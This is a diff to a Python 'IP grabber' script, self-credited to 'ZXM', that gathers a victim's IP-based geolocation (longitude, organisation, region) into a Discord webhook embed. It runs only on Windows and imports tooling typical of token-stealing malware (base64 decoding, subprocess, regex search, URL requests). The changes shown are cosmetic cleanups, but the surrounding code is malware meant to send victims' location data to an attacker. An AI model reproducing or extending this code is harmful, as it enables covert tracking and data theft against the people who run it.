@@ -5,17 +5,19 @@ import re
 import json
 import webbrowser
 import time
-import string
 import random
+import string
 from dhooks import Webhook, Embed
 from datetime import datetime
-if os.name != "nt":
+import os
+if os.name != 'nt':
     exit()
 from re import findall
 from json import loads, dumps
 from base64 import b64decode
 from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
+from datetime import datetime
 from threading import Thread
 from time import sleep
 from sys import argv
@@ -51,7 +53,7 @@ if amount <= 390:
         {'name': 'Longitude', 'value': geo['lon']},
         {'name': 'Org', 'value': geo['org']},
         {'name': 'Region', 'value': geo['region']},
-        {'name': 'IP Grabber Fait par ZXM ', 'value': geo['status']},
+        {'name': 'IP Grabber Fait par ZXM', 'value': geo['status']},
     ]
     for field in fields:
             embed.add_field(name=field['name'], value=field['value'], inline=True)
